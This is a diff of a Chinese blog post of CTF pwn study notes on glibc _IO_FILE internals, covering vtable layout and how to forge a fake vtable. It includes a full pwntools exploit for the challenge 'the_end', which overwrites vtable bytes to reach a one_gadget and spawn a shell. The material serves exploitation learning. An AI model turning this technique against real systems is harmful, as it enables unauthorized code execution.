@@ -156,7 +156,7 @@
             <span>
                 
                   
-                    <a href="/tags/other">other</a>
+                    <a href="/tags/io_file">io_file</a>
                   
                 
             </span>
@@ -169,76 +169,72 @@
     <html><head></head><body><p>io_file学习笔记</p>
 <h3 id="0）review">0）review<a class="post-anchor" href="#0）review"></a></h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
 <p>结构源码如下</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
-<span class="token punctuation">{</span>
-    _IO_FILE    file<span class="token punctuation">;</span>
-    IO_jump_t   <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="c">struct _IO_FILE_plus
+{
+    _IO_FILE    file;
+    IO_jump_t   *vtable;
+}
+</code></pre>
 <p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
 <p>以fread为例子简述io_file结构调用的流程</p>
 <h4 id="fread">fread<a class="post-anchor" href="#fread"></a></h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
 <p>下面是<code>_IO_sgetn</code>的源码。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">_IO_size_t
-<span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
-     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
-     <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
-     _IO_size_t n<span class="token punctuation">;</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">return</span> <span class="token function">_IO_XSGETN</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
+<pre><code class="c">_IO_size_t
+_IO_sgetn (fp, data, n)
+     _IO_FILE *fp;
+     void *data;
+     _IO_size_t n;
+{
+  return _IO_XSGETN (fp, data, n);
+}
+</code></pre>
 <p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
 <p>也就是<code>_IO_XSGETN</code>。</p>
 <p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
 <p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
 <p><code>_IO_jump_t</code>源码如下</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span>
-<span class="token punctuation">{</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token comment">/* showmany */</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
-    get_column<span class="token punctuation">;</span>
-    set_column<span class="token punctuation">;</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="c">struct _IO_jump_t
+{
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+    get_column;
+    set_column;
+#endif
+};
+</code></pre>
 <p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
 <p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
 <p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_base
-        <span class="token operator">&amp;&amp;</span> want <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__underflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
-      <span class="token keyword">break</span><span class="token punctuation">;</span>
+<pre><code class="c">  if (fp-&gt;_IO_buf_base
+          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))
+        {
+          if (__underflow (fp) == EOF)
+        break;
 
-        <span class="token keyword">continue</span><span class="token punctuation">;</span>
-      <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
+          continue;
+        }
+</code></pre>
 <p>函数源码如上，实现的是一个键盘输入。 </p>
 <p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
 <h3 id="伪造vtable">伪造vtable<a class="post-anchor" href="#伪造vtable"></a></h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
@@ -247,92 +243,91 @@
 <p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
 <p>但是我们先从第一个方法来试一试。</p>
 <p>示例来源于ctf-wiki</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
-    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>vtable_ptr<span class="token punctuation">;</span>
-    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"123.txt"</span><span class="token punctuation">,</span><span class="token string">"rw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    vtable_ptr<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fp<span class="token operator">+</span><span class="token number">0xd8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//get vtable</span>
+<pre><code class="c">int main(void)
+{
+    FILE *fp;
+    long long *vtable_ptr;
+    fp=fopen("123.txt","rw");
+    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
 
-    vtable_ptr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x41414141</span> <span class="token comment">//xsputn</span>
+    vtable_ptr[7]=0x41414141 //xsputn
 
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call 0x41414141"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    printf("call 0x41414141");
+}
+</code></pre>
 <p>这边利用的具体步骤比较直观。</p>
 <p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
 <p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
 <p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
 <p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">&gt;</span> print _IO_2_1_stdin_
-<span class="token variable">$2</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
-  <span class="token function">file</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
-    _flags <span class="token operator">=</span> -72540024, 
-    _IO_read_ptr <span class="token operator">=</span> 0x0, 
-    _IO_read_end <span class="token operator">=</span> 0x0, 
-    _IO_read_base <span class="token operator">=</span> 0x0, 
-    _IO_write_base <span class="token operator">=</span> 0x0, 
-    _IO_write_ptr <span class="token operator">=</span> 0x0, 
-    _IO_write_end <span class="token operator">=</span> 0x0, 
-    _IO_buf_base <span class="token operator">=</span> 0x0, 
-    _IO_buf_end <span class="token operator">=</span> 0x0, 
-    _IO_save_base <span class="token operator">=</span> 0x0, 
-    _IO_backup_base <span class="token operator">=</span> 0x0, 
-    _IO_save_end <span class="token operator">=</span> 0x0, 
-    _markers <span class="token operator">=</span> 0x0, 
-    _chain <span class="token operator">=</span> 0x0, 
-    _fileno <span class="token operator">=</span> <span class="token number">0</span>, 
-    _flags2 <span class="token operator">=</span> <span class="token number">0</span>, 
-    _old_offset <span class="token operator">=</span> -1, 
-    _cur_column <span class="token operator">=</span> <span class="token number">0</span>, 
-    _vtable_offset <span class="token operator">=</span> <span class="token number">0</span> <span class="token string">'\000'</span>, 
-    _shortbuf <span class="token operator">=</span> <span class="token string">""</span>, 
-    _lock <span class="token operator">=</span> 0x7ffff7dcf8d0 <span class="token operator">&lt;</span>_IO_stdfile_0_lock<span class="token operator">&gt;</span>, 
-    _offset <span class="token operator">=</span> -1, 
-    _codecvt <span class="token operator">=</span> 0x0, 
-    _wide_data <span class="token operator">=</span> 0x7ffff7dcdae0 <span class="token operator">&lt;</span>_IO_wide_data_<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>, 
-    _freeres_list <span class="token operator">=</span> 0x0, 
-    _freeres_buf <span class="token operator">=</span> 0x0, 
-    __pad5 <span class="token operator">=</span> <span class="token number">0</span>, 
-    _mode <span class="token operator">=</span> <span class="token number">0</span>, 
-    _unused2 <span class="token operator">=</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">19</span> times<span class="token operator">&gt;</span>
-  <span class="token punctuation">}</span>, 
-  vtable <span class="token operator">=</span> 0x7ffff7dca2a0 <span class="token operator">&lt;</span>_IO_file_jumps<span class="token operator">&gt;</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="bash">pwndbg&gt; print _IO_2_1_stdin_
+$2 = {
+  file = {
+    _flags = -72540024, 
+    _IO_read_ptr = 0x0, 
+    _IO_read_end = 0x0, 
+    _IO_read_base = 0x0, 
+    _IO_write_base = 0x0, 
+    _IO_write_ptr = 0x0, 
+    _IO_write_end = 0x0, 
+    _IO_buf_base = 0x0, 
+    _IO_buf_end = 0x0, 
+    _IO_save_base = 0x0, 
+    _IO_backup_base = 0x0, 
+    _IO_save_end = 0x0, 
+    _markers = 0x0, 
+    _chain = 0x0, 
+    _fileno = 0, 
+    _flags2 = 0, 
+    _old_offset = -1, 
+    _cur_column = 0, 
+    _vtable_offset = 0 '\000', 
+    _shortbuf = "", 
+    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, 
+    _offset = -1, 
+    _codecvt = 0x0, 
+    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, 
+    _freeres_list = 0x0, 
+    _freeres_buf = 0x0, 
+    __pad5 = 0, 
+    _mode = 0, 
+    _unused2 = '\000' &lt;repeats 19 times&gt;
+  }, 
+  vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;
+}
+</code></pre>
 <p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>
 <p>然后我们需要在它附近伪造一个vtable。</p>
 <ol>
 <li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>
 </ol>
 <p>完整exp</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
+<pre><code class="python">from pwn import *
+context.log_level="debug"
 
-libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'the_end'</span><span class="token punctuation">)</span>
+libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
+p = process('the_end')
 
-libc_base <span class="token operator">=</span> <span class="token builtin">long</span><span class="token punctuation">(</span>sleep_ad<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'sleep'</span><span class="token punctuation">]</span>
-one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf02b0</span>
-vtables <span class="token operator">=</span>     libc_base <span class="token operator">+</span> <span class="token number">0x3C56F8</span>
+libc_base = long(sleep_ad,16) - libc.symbols['sleep']
+one_gadget = libc_base + 0xf02b0
+vtables =     libc_base + 0x3C56F8
 
-fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5588</span>
-target_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c55e0</span>
+fake_vtable = libc_base + 0x3c5588
+target_addr = libc_base + 0x3c55e0
 
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>vtables<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+for i in range(2):
+    p.send(p64(vtables+i))
+    p.send(p64(fake_vtable)[i])
 
 
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>target_addr<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+for i in range(3):
+    p.send(p64(target_addr+i))
+    p.send(p64(one_gadget)[i])
 
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exec /bin/sh 1&gt;&amp;0"</span><span class="token punctuation">)</span>
+p.sendline("exec /bin/sh 1&gt;&amp;0")
 
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+p.interactive()
+</code></pre>
 <h4 id="总结">总结<a class="post-anchor" href="#总结"></a></h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
 <p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
 <h3 id="FSOP">FSOP<a class="post-anchor" href="#FSOP"></a></h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>
